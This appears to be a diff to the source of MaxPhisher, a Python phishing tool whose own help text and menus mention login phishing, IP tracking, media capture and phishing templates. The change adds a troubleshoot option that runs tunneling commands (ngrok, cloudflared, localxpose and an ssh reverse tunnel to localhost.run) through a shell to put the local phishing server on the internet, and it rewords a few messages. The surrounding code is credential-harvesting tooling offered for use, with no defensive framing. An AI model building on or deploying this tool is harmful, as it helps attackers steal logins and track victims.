@@ -309,6 +309,7 @@ argparser.add_argument("-i", "--ytid", default=default_ytid, help=f"Youtube vide
 argparser.add_argument("-u", "--url", help="Redirection url for ip-tracking or login phishing [Default : null]")
 argparser.add_argument("-s", "--duration", type=int, default=default_duration, help=f"Media duration while capturing [Default : {default_duration}(ms)]")
 argparser.add_argument("-m", "--mode", help="Mode of MaxPhisher [Default: normal]")
+argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
 argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
 
@@ -327,10 +328,21 @@ url = args.url
 directory = args.directory
 duration = args.duration
 mode = args.mode
+troubleshoot = args.troubleshoot
 key = args.nokey if mode != "test" else False
 update = args.noupdate
 
 local_url = f"127.0.0.1:{port}"
+
+ts_commands = {
+    "ngrok": f"{nr_command} http {port}",
+    "cloudflared": f"{cf_command} tunnel -url {local_url}",
+    "localxpose": f"{lx_command} tunnel http -t {local_url}",
+    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "cf": f"{cf_command} tunnel -url {local_url}",
+    "loclx": f"{lx_command} tunnel http -t {local_url}",
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+}
 
 # My utility functions
 
@@ -1249,17 +1261,21 @@ def requirements():
         if "@gmail.com" in email:
             is_mail_ok = True
         else:
-            print(f"\n{error}Only gmail with app password is allowed")
+            print(f"\n{error}Only gmail with app password is allowed!{nc}")
             sleep(1)
 
         
 # Main Menu to choose phishing type
 def main_menu():
-    global ptype, mode
+    global ptype, mode, troubleshoot
     shell("stty -echoctl") # Skip printing ^C
     if update:
         updater()
     requirements()
+    if troubleshoot in ts_commands:
+        command = ts_commands[troubleshoot]
+        shell(command)
+        pexit()
     tempdata = cat(templates_file)
     if is_json(tempdata):
         templates = parse(tempdata)
@@ -1449,7 +1465,7 @@ def server():
         sleep(1)
     if nr_success or cf_success or lx_success or lhr_success:
         if mode == "test":
-            print(f"\n{info}URL Generation completed successfully!")
+            print(f"\n{info}URL generation has completed successfully!")
             print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
             pexit()
         sprint(f"\n{info}Your urls are given below : \n")
